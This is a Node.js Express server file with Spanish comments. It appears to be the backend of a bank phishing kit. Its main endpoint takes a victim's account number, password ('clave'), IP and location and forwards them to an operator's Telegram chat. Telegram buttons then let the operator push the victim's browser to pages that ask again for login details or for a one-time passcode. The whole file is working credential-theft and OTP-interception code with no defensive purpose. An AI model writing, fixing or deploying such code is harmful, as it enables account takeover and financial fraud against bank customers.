// ✅ server.js corregido con botones funcionales y webhook funcionando correctamente

import express from "express";
import bodyParser from "body-parser";
import fetch from "node-fetch";
import dotenv from "dotenv";
import cors from "cors";
import { v4 as uuidv4 } from "uuid";

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || "https://servidor-trico.onrender.com";
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const sessionMap = new Map();

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ✅ FUNCIONES UTILES
function buttonsForStep(step, sessionId) {
  if (step === "virtual") {
    return {
      inline_keyboard: [
        [
          { text: "🔁 Error Logo", callback_data: `error_logo_${sessionId}` },
          { text: "🔁 Error OTP", callback_data: `error_otp_${sessionId}` }
        ],
        [
          { text: "✅ Siguiente", callback_data: `siguiente_${sessionId}` }
        ]
      ]
    };
  }
  return {};
}

async function tgSendMessage(text, reply_markup = null) {
  await fetch(`${TG_API}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      ...(reply_markup && { reply_markup })
    })
  });
}

// ✅ ENDPOINT PRINCIPAL /virtualpersona
app.post("/virtualpersona", async (req, res) => {
  const { numero, clave, ip, location } = req.body;
  const sessionId = uuidv4();
  sessionMap.set(sessionId, { status: "pending" });

  const message = `🔐 *Nuevo acceso virtual:*

📱 Número: ${numero}
🔑 Clave: ${clave}
🌐 IP: ${ip}
📍 Ubicación: ${location}
🆔 ID: ${sessionId}`;

  await tgSendMessage(message, buttonsForStep("virtual", sessionId));
  res.json({ sessionId });
});

// ✅ ENDPOINT polling desde loading.html
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const session = sessionMap.get(sessionId);

  if (!session || !session.redirect_to) {
    return res.json({});
  }
  res.json({ redirect_to: session.redirect_to });
});

// ✅ ENDPOINT para setear webhook automáticamente
app.get("/set-webhook", async (req, res) => {
  const url = `${PUBLIC_BASE_URL}/telegram/webhook`;
  const response = await fetch(`${TG_API}/setWebhook`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ url })
  });

  const data = await response.json();
  res.json(data);
});

// ✅ ENDPOINT para recibir respuestas de botones (webhook de Telegram)
app.post("/telegram/webhook", async (req, res) => {
  const body = req.body;

  if (!body.callback_query) {
    return res.sendStatus(200);
  }

  const data = body.callback_query.data;
  const callbackId = body.callback_query.id;
  const chatId = body.callback_query.message.chat.id;

  const [accion, , sessionId] = data.split("_");

  let redirectPath;
  switch (accion) {
    case "error":
      if (data.includes("logo")) redirectPath = "/Virtual-Persona.html";
      if (data.includes("otp")) redirectPath = "/otp-check.html";
      break;
    case "siguiente":
      redirectPath = "/otp-check.html";
      break;
  }

  if (redirectPath && sessionMap.has(sessionId)) {
    sessionMap.set(sessionId, { redirect_to: redirectPath });
  }

  // ✅ Responder a Telegram correctamente (corrección crítica)
  await fetch(`${TG_API}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: callbackId,
      text: "✅ Acción recibida.",
      show_alert: false
    })
  });

  res.sendStatus(200);
});

// ✅ Servidor activo
app.listen(port, () => {
  console.log(`🚀 Servidor en http://localhost:${port}`);
});
